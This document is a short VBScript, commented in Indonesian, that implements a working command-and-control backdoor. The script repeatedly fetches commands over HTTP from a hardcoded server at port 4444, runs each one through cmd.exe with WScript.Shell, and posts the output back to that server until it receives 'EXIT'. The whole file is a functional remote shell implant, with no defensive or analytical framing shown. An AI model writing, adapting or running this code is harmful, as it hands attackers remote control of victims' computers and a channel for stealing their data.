Option Explicit
On Error Resume Next ' Mengabaikan kesalahan runtime agar script tetap berjalan meskipun terjadi error

' URL callback yang akan digunakan untuk komunikasi dengan server C2
CONST callbackUrl = "http://192.168.1.1:4444/"

' Mendeklarasikan variabel yang akan digunakan
Dim xmlHttpReq, shell, execObj, command, break, result

' Membuat objek WScript.Shell untuk menjalankan perintah sistem
Set shell = CreateObject("WScript.Shell")

' Inisialisasi variabel `break` sebagai False untuk menjalankan loop utama
break = False

' Memulai loop utama untuk komunikasi terus-menerus dengan server C2
While break <> True
    ' Membuat objek XMLHTTP untuk melakukan request GET ke server
    Set xmlHttpReq = WScript.CreateObject("MSXML2.ServerXMLHTTP")
    xmlHttpReq.Open "GET", callbackUrl, false ' Melakukan request GET ke server
    xmlHttpReq.Send ' Mengirim request
    
    ' Mengambil perintah dari response server dan menyiapkannya untuk eksekusi
    command = "cmd /c " & Trim(xmlHttpReq.responseText)

    ' Memeriksa apakah perintah yang diterima adalah "EXIT"
    If InStr(command, "EXIT") Then
        break = True ' Jika "EXIT", loop akan berhenti
    Else
        ' Menjalankan perintah yang diterima menggunakan shell.Exec
        Set execObj = shell.Exec(command)
        
        ' Membaca hasil dari eksekusi perintah
        result = ""
        Do Until execObj.StdOut.AtEndOfStream
            result = result & execObj.StdOut.ReadAll() ' Menyimpan output perintah ke variabel `result`
        Loop

        ' Membuat objek XMLHTTP untuk mengirim hasil eksekusi kembali ke server
        Set xmlHttpReq = WScript.CreateObject("MSXML2.ServerXMLHTTP")
        xmlHttpReq.Open "POST", callbackUrl, false ' Membuka koneksi POST ke server
        xmlHttpReq.Send(result) ' Mengirimkan hasil eksekusi perintah
    End If
Wend ' Mengulang proses hingga variabel `break` diatur menjadi True
